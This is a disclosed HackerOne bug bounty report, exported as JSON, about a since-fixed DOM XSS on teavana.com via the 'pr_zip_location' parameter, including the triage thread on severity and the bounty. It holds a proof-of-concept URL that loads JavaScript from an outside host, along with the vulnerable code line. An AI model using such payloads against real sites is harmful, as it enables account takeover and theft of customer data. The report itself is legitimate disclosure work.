{"id":209736,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDk3MzY=","url":"https://hackerone.com/reports/209736","title":"DOM XSS on teavana.com via \"pr_zip_location\" parameter","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-01T00:57:21.852Z","submitted_at":"2017-03-01T00:57:21.852Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fizhimchik","url":"/fizhimchik","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/135/840/92c9d168ef3a98d597387a1fe38d5d014bbbf051_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-03T13:33:55.922Z","bug_reporter_agreed_on_going_public_at":"2017-04-03T19:26:25.952Z","team_member_agreed_on_going_public_at":"2017-05-03T13:33:55.868Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello Starbucks team,,\n\nI've discovered DOM XSS on `teavana.com` involving `pr_zip_location` URL parameter. PoC:\n\nhttp://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?\n\nWorks in all major browsers. Vulnerable code is in `full.js`:\n\n```js\nvar DR = Z(DS) + \"/content/\" + k(DQ) + \"/contents.js\";\n```\n\nThat allows to execute absolutely arbitrary javascript in the context on `teavana.com` domain. As described in #202011 that directly leads to theft of customer account data and account takeover, hence I set severity to Critical.\n\nAlso, I have discovered a number of other XSS attacks on similar pages, involving other parameters and sinks. Should I submit them all as individual bug reports?\n\nThanks.\n","vulnerability_information_html":"\u003cp\u003eHello Starbucks team,,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve discovered DOM XSS on \u003ccode\u003eteavana.com\u003c/code\u003e involving \u003ccode\u003epr_zip_location\u003c/code\u003e URL parameter. PoC:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j\" href=\"/redirect?url=http%3A%2F%2Fwww.teavana.com%2Fus%2Fen%2Ftea%2Fgreen-tea%2Fwinterberry-tea-blend-32601.html%3Fpr_zip_location%3D%2F%2Fwhitehat-hacker.com%2Fxss.j\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e?\u003c/p\u003e\n\n\u003cp\u003eWorks in all major browsers. Vulnerable code is in \u003ccode\u003efull.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eDR\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eZ\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eDS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/content/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eDQ\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/contents.js\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThat allows to execute absolutely arbitrary javascript in the context on \u003ccode\u003eteavana.com\u003c/code\u003e domain. As described in \u003ca href=\"/reports/202011\"\u003e#202011\u003c/a\u003e that directly leads to theft of customer account data and account takeover, hence I set severity to Critical.\u003c/p\u003e\n\n\u003cp\u003eAlso, I have discovered a number of other XSS attacks on similar pages, involving other parameters and sinks. Should I submit them all as individual bug reports?\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-03T19:26:25.999Z","allow_singular_disclosure_after":-115378192.43322136,"singular_disclosure_allowed":true,"vote_count":15,"voters":["rhynorater","rootkid","ysx","mpz","eveeez","khizer47","exception","darwinks","sumit7","codequick","and 5 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1516570,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-02T23:00:33.592Z","updated_at":"2017-03-02T23:00:33.592Z","additional_data":{"old_severity":"Critical","new_severity":"Medium","old_severity_id":28574,"new_severity_id":28949},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1516574,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you. \n","markdown_message":"\u003cp\u003eThanks for sending this in! We are currently reviewing this submission and we\u0026#39;ll notify you once we have more information to share with you. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-02T23:04:30.408Z","updated_at":"2017-03-02T23:04:30.408Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1529034,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @nirvana-msu!\nOur store team is working on this and we'll be in touch as soon as we have an update.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/nirvana-msu\"\u003e@nirvana-msu\u003c/a\u003e!\u003cbr\u003e\nOur store team is working on this and we\u0026#39;ll be in touch as soon as we have an update.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-09T03:08:20.691Z","updated_at":"2017-03-09T03:08:20.691Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1529035,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-09T03:08:28.105Z","updated_at":"2017-03-09T03:08:28.105Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"fizhimchik","url":"/fizhimchik"},"actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1531202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@siren, thanks for the bounty!\n\nJust for my benefit / so I would manage the expectations of potential future submissions I may make - would you mind please clarifying why you consider the impact of such XSS to be Medium? You policy page suggests that issues resulting in \"unauthorized access to account data\" are deemed as Critical vulnerabilities. This is exactly what would happen if a person, authenticated on your website, visits such a link, as demonstrated in #202011. If you disagree, you might want to make your policy a bit more specific to avoid such confusion.\n\nThanks again for your time and consideration.","markdown_message":"\u003cp\u003e\u003ca href=\"/siren\"\u003e@siren\u003c/a\u003e, thanks for the bounty!\u003c/p\u003e\n\n\u003cp\u003eJust for my benefit / so I would manage the expectations of potential future submissions I may make - would you mind please clarifying why you consider the impact of such XSS to be Medium? You policy page suggests that issues resulting in \u0026quot;unauthorized access to account data\u0026quot; are deemed as Critical vulnerabilities. This is exactly what would happen if a person, authenticated on your website, visits such a link, as demonstrated in \u003ca href=\"/reports/202011\"\u003e#202011\u003c/a\u003e. If you disagree, you might want to make your policy a bit more specific to avoid such confusion.\u003c/p\u003e\n\n\u003cp\u003eThanks again for your time and consideration.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-10T00:39:46.975Z","updated_at":"2017-03-10T00:41:27.571Z","actor":{"username":"fizhimchik","cleared":false,"url":"/fizhimchik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/135/840/92c9d168ef3a98d597387a1fe38d5d014bbbf051_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1560651,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sharpie, I can see that the above exploit does not seem to work anymore (the page is redirected). Can we consider this resolved?\n\nThanks.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sharpie\"\u003e@sharpie\u003c/a\u003e, I can see that the above exploit does not seem to work anymore (the page is redirected). Can we consider this resolved?\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-24T03:14:11.827Z","updated_at":"2017-03-24T03:14:11.827Z","actor":{"username":"fizhimchik","cleared":false,"url":"/fizhimchik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/135/840/92c9d168ef3a98d597387a1fe38d5d014bbbf051_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1561901,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @nirvana-msu,\n\nYou are correct! This issue was resolved as a result of a recent push to production from our development team.\n\nThank you for your participation in our bounty program. We look forward to working with you again in the future.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nirvana-msu\"\u003e@nirvana-msu\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eYou are correct! This issue was resolved as a result of a recent push to production from our development team.\u003c/p\u003e\n\n\u003cp\u003eThank you for your participation in our bounty program. We look forward to working with you again in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-24T17:37:49.905Z","updated_at":"2017-03-24T17:37:49.905Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fizhimchik","url":"/fizhimchik"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1581443,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Could we disclose this report publicly? Thanks!","markdown_message":"\u003cp\u003eCould we disclose this report publicly? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T19:26:25.968Z","updated_at":"2017-04-03T19:26:25.968Z","first_to_agree":true,"actor":{"username":"fizhimchik","cleared":false,"url":"/fizhimchik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/135/840/92c9d168ef3a98d597387a1fe38d5d014bbbf051_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1651361,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-03T13:33:55.890Z","updated_at":"2017-05-03T13:33:55.890Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1651362,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-03T13:33:55.938Z","updated_at":"2017-05-03T13:33:55.938Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}